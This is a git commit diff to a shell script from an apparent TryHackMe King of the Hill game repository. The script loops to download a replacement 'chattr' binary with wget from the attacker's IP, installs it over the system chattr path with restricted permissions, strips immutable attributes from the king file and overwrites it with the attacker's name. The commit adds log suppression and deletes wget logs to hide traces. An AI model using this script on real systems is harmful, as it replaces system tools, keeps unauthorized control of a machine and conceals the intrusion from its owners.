35ece4fe0c734a77f96c457e7f18a38fb612e906
Faruk <98034193+farukerdem34@users.noreply.github.com>
2023-08-29 11:04:29 -0400

    Update script.sh

--- THM-KOTH/scripts/script.sh
+++ THM-KOTH/scripts/script.sh
@@ -7,9 +7,10 @@ local_IP='10.8.85.10'
 while true; do
 if [[ ! -e $chattr_path ]]; then
 	cd $fake_chattr_path
-	wget $local_IP'/chattr'
+	wget $local_IP'/chattr' -o '/dev/null'
 	mv $fake_chattr_path'/chattr' $chattr_path
 	chmod 100 $chattr_path
+	rm -rf $fake_chattr_path"/wget-log*"
 fi 
 $chattr_path -ia $king_path
 echo 'lomarkomar' >| $king_path
